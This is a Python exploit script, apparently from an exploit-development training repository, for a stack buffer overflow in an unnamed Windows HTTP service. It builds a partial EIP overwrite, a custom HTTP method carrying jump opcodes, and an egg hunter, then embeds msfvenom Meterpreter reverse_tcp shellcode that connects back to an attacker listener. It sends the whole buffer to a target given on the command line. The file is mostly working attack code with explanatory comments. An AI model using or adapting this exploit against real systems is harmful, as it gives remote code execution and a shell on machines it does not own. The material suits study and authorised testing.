#!/usr/bin/python

import socket
import sys
from struct import pack

try:
 server = sys.argv[1]
 # Stack layout
 port = 80
 size = 253 #size was 260, with 3 bytes left in buffer space, partial EIP offset at 253. Adjusted for partial EIP overwrite.
 
 # Executable is mapped in an addr range begins/contains a nullbyte.
 # We can use str null terminator at the end of our inputBuffer as part of our EIP overwrite.
 # This allows us to redirect execution flow to any ASM instruction we choose within the address range of the target executable.
 # In this context, we do this only overwriting the lower 3 bytes of the EIP register.

 # bad characters - "\x00\x0A\x0D\x20\x25"

 # changed httpMethod from GET to custom - better use of space, short jump of 0x17 opcode here (\xeb\x17) to hit our target buffer space for payload execution (more reliable). 
 # However, different memory allocation means different operations and checks performed on the operations stored by them which caused our input of short jump to be mangled (different set of bad characters here). 
 # Alternative used here is instead a conditional jump (use of arithmetic operations) on the ESP register and make it point to beginning of buffer. However, there may also be a different more trivial instruction.
 # Limited space in httpMethod below, however should be enough space within httpMethod for the aforementioned.
  
 #jmp if equal (JE) conditional jump, based on value of the ZF (zero flag) register = 1 (\x0F\x84\x11 = 0F8411000000), existing nullbyte completes the instruction.
 httpMethod = b"\x31\xC9" + b"\x85\xC9"  + b"\x0F\x84\x11" + b" /" # xor ecx, ecx ; test ecx, ecx; je 0x17

 # Egg hunter via Keystone Engine; searches the process VAS (virtual address space) for an egg, a unique tag prepending the payload we want to execute.
 # Windows 10 Pro specific egg (syscall number changes) - ntdll!NtAccessCheckAndAuditAlarm = 1C6h, updating our egg there are nullchars present so we use assembly negate instruction.
 # Remember we are running on x86 and not an x64 architecture, so if we run the negate operation on our register, the result will be stored on the lower DWORD of the total value, allowing us to avoid nullbytes.
 # Not the most reliable method by hardcoding the sys call, will create an improved reliable exploit in this repo for increased portability/reliability for win targets we have no knowledfe of underlying OS.
  
 """
        from keystone import *

        EGGHUNTER = (
                # We use the edx register as a memory page counter
        "							 " 
        "	loop_inc_page:			 "
                # Go to the last address in the memory page
        "		or dx, 0x0fff		;" 
        "	loop_inc_one:			 "
                # Increase the memory counter by one
        "		inc edx				;"
        "	loop_check:				 "
                # Save the edx register which holds our memory 
                # address on the stack
        "		push edx			;"
                # Push the negative value of the system 
                # call number
        "		mov eax, 0xfffffe3a	;" 
                # Initialize the call to NtAccessCheckAndAuditAlarm
        "		neg eax				;" 
                # Perform the system call
        "		int 0x2e			;" 
                # Check for access violation, 0xc0000005 
                # (ACCESS_VIOLATION)
        "		cmp al,05			;" 
                # Restore the edx register to check 
                # later for our egg
        "		pop edx				;" 
        "	loop_check_valid:		 "
                # If access violation encountered, go to n
                # ext page
        "		je loop_inc_page	;" 
        "	is_egg:					 "
                # Load egg (w00t in this example) into 
                # the eax register
        "		mov eax, 0x74303077	;" 
                # Initializes pointer with current checked 
                # address 
        "		mov edi, edx		;" 
                # Compare eax with doubleword at edi and 
                # set status flags
        "		scasd				;" 
                # No match, we will increase our memory 
                # counter by one
        "		jnz loop_inc_one	;" 
                # First part of the egg detected, check for 
                # the second part
        "		scasd				;" 
                # No match, we found just a location 
                # with half an egg
        "		jnz loop_inc_one	;" 
        "	matched:				 "
                # The edi register points to the first 
                # byte of our buffer, we can jump to it
        "		jmp edi				;" 
        )
 """

 # resulting egg hunter opcodes from above assembly
 egghunter = b"\x90\x90\x90\x90\x90\x90\x90\x90\x66\x81\xca\xff\x0f\x42\x52\xb8\x3a\xfe\xff\xff\xf7\xd8\xcd\x2e\x3c\x05\x5a\x74\xeb\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe6\xaf\x75\xe3\xff\xe7"
 
 inputBuffer = b"\x41" * (size - len(egghunter))
 # lower 3 byte overwrite, ensures the terminating str null byte is within our EIP overwrite (00424242). Important not to append anything to the final buffer here, otherwise will replace the nullbyte of our partial EIP overwrite.
 inputBuffer += pack("<L", (0x418674)) # Partial EIP overwrite - 0x00418674 - pop eax; ret (lm m <executable> ; s -b 00400000 00452000 58 C3 (pop eax ; ret) instruction. Address chosen here doesn't contain any further nullbyte or badchars.
 httpEndRequest = b"\r\n\r\n"
 
 # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.169 LPORT=443 -f python -v payload 
 # secondary buffer bad chars = zero - no need to retract any bad chars.
 payload =  b""
 payload += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5"
 payload += b"\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x31"
 payload += b"\xff\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xc0\xac"
 payload += b"\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
 payload += b"\x49\x75\xef\x52\x8b\x52\x10\x57\x8b\x42\x3c"
 payload += b"\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0"
 payload += b"\x8b\x58\x20\x01\xd3\x50\x8b\x48\x18\x85\xc9"
 payload += b"\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31"
 payload += b"\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4"
 payload += b"\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58"
 payload += b"\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01"
 payload += b"\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
 payload += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
 payload += b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00"
 payload += b"\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
 payload += b"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29"
 payload += b"\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a"
 payload += b"\x0a\x68\xc0\xa8\x2d\xa9\x68\x02\x00\x01\xbb"
 payload += b"\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68"
 payload += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57"
 payload += b"\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a"
 payload += b"\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a"
 payload += b"\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
 payload += b"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
 payload += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
 payload += b"\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
 payload += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28"
 payload += b"\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b"
 payload += b"\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61"
 payload += b"\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
 payload += b"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6"
 payload += b"\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53"
 payload += b"\xff\xd5"

 shellcode = b"w00tw00t" + payload + b"\x44" * (400 - len(payload)) #theEgg

 buf = httpMethod + egghunter + inputBuffer + httpEndRequest + shellcode

 print("Sending evil buffer...")
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((server, port))
 s.send(buf)
 s.close()

 print("Done!")

except socket.error:
    print("Could not connect!")
